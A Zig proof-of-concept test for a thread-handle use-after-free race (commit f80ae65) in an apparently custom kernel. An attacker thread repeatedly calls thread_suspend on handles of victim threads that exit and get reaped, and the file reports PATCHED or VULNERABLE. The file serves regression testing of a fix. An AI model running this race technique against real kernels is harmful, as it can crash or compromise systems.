// PoC for f80ae65: thread-handle TOCTOU UAF in syscall thread lookups.
//
// Pre-patch: Process.getPermByHandle returns a PermissionEntry by value.
// sysThreadSuspend (and friends — Resume / Kill / SetThreadMode / pmu_*)
// snapshot the entry, drop perm_lock, then dereference entry.object.thread
// to read target.state / target.process. Meanwhile, on another core, the
// victim thread runs Thread.deinit (scheduled after the victim hits
// sysThreadExit). Thread.deinit removes the thread handle from this
// process's perm table (clearing the slot) and then frees the slab slot
// via allocator.destroy(self). The window between *snapshot grab* (slot
// still populated) and the dereference of the snapshot is the race: a
// concurrent deinit on another core wins the perm_lock, clears the slot,
// and frees the Thread before the dereference. The dereference touches
// freed memory — in Debug builds the slab allocator's "use null after
// free" safety check fires, panicking the kernel with `attempt to use
// null value @ free` from a deinit chain rooted in the syscall.
//
// Post-patch: callers go through Process.acquireThreadRef which bumps
// Thread.handle_refcount under perm_lock; Thread.deinit defers the final
// allocator.destroy until refcount hits zero. The snapshot is now pinned;
// the race no longer hands out a freed pointer.
//
// PoC strategy:
//   - One attacker thread (no pinning) spins on a shared cell that holds
//     the freshest victim handle, calling thread_suspend on it as fast as
//     possible. We use thread_suspend (not thread_kill) because suspend
//     never calls Thread.deinit itself. That isolates the test to the
//     snapshot/dereference race that f80ae65 fixes (thread_kill would
//     also stress the separate double-deinit class fixed by 7df802e and
//     conflate the signal).
//   - Main thread loops: thread_create(victim), publish handle, thread_yield.
//     The victim immediately calls thread_exit, becoming a zombie that the
//     scheduler reaps on its assigned core. The reap calls Thread.deinit,
//     which races the attacker's snapshot+dereference.
//
// We do NOT pin either thread to a specific core — letting the scheduler
// distribute the spawner, attacker, and victims across all 4 cores keeps
// reap latency low (pinning the spawner causes the per-core run queue to
// fill faster than the local timer reaps, hitting MAX_THREADS).
//
// Differential signal:
//   PATCHED   → "POC-f80ae65: PATCHED (...)" printed after all rounds.
//   VULNERABLE → kernel panic, no shutdown, no PATCHED line. The runner's
//                grep for "POC.*PATCHED" finds nothing. (The PoC also
//                defensively prints VULNERABLE if any syscall returns an
//                out-of-spec code.)

const lib = @import("lib");
const syscall = lib.syscall;

const ROUNDS: u64 = 1500;

// Shared cell: spawner publishes the freshest victim handle, attacker reads.
var victim_handle: u64 align(8) = 0;
// Spawner writes generation; attacker matches against last_seen so it can
// only act on freshly-published handles.
var generation: u64 align(8) = 0;
// Set to non-zero by spawner when it has finished all rounds, signaling
// the attacker to exit.
var done: u64 align(8) = 0;

fn victimEntry() void {
    syscall.thread_exit();
}

fn attackerEntry() void {
    var last_seen: u64 = 0;
    while (true) {
        const g = @atomicLoad(u64, &generation, .acquire);
        if (g == last_seen) {
            if (@atomicLoad(u64, &done, .acquire) != 0) {
                syscall.thread_exit();
            }
            asm volatile ("pause");
            continue;
        }
        last_seen = g;

        const h = @atomicLoad(u64, &victim_handle, .acquire);
        if (h == 0) continue;

        // Hammer the same handle a few times to widen the window during
        // which our snapshot pointer might still be valid while the
        // victim's deinit is being run on another core by the scheduler
        // reap path.
        var i: u32 = 0;
        while (i < 16) {
            const rc = syscall.thread_suspend(h);
            // E_OK (0), E_BADCAP/E_BADHANDLE (-3), E_BUSY (-11), E_PERM (-2),
            // E_INVAL (-1, e.g. blocked→suspend rejection) are acceptable.
            if (rc != 0 and rc != -1 and rc != -3 and rc != -11 and rc != -2) {
                syscall.write("POC-f80ae65: VULNERABLE (out-of-spec rc from thread_suspend)\n");
                syscall.shutdown();
            }
            i += 1;
        }
    }
}

pub fn main(_: u64) void {
    syscall.write("POC-f80ae65: starting\n");

    // Launch the attacker. No affinity — let the scheduler place it.
    const ah = syscall.thread_create(attackerEntry, 0, 4);
    if (ah < 0) {
        syscall.write("POC-f80ae65: attacker thread_create failed\n");
        syscall.shutdown();
    }

    var round: u64 = 0;
    var failed_creates: u64 = 0;
    while (round < ROUNDS) {
        const h = syscall.thread_create(victimEntry, 0, 4);
        if (h < 0) {
            failed_creates += 1;
            if (failed_creates > 1_000_000) {
                syscall.write("POC-f80ae65: thread table never drains\n");
                syscall.shutdown();
            }
            syscall.thread_yield();
            continue;
        }
        const handle: u64 = @intCast(h);

        @atomicStore(u64, &victim_handle, handle, .release);
        _ = @atomicRmw(u64, &generation, .Add, 1, .release);

        // Yield so the scheduler can run the victim on another core,
        // letting it reach thread_exit and start the reap path that
        // races our attacker's snapshot+dereference.
        syscall.thread_yield();

        round += 1;
    }

    // Tell the attacker we are done.
    @atomicStore(u64, &done, 1, .release);
    _ = @atomicRmw(u64, &generation, .Add, 1, .release);

    // Give the attacker a chance to drain and exit.
    var drain: u64 = 0;
    while (drain < 16) {
        syscall.thread_yield();
        drain += 1;
    }

    syscall.write("POC-f80ae65: PATCHED (thread_suspend snapshot/UAF race survived)\n");
    syscall.shutdown();
}
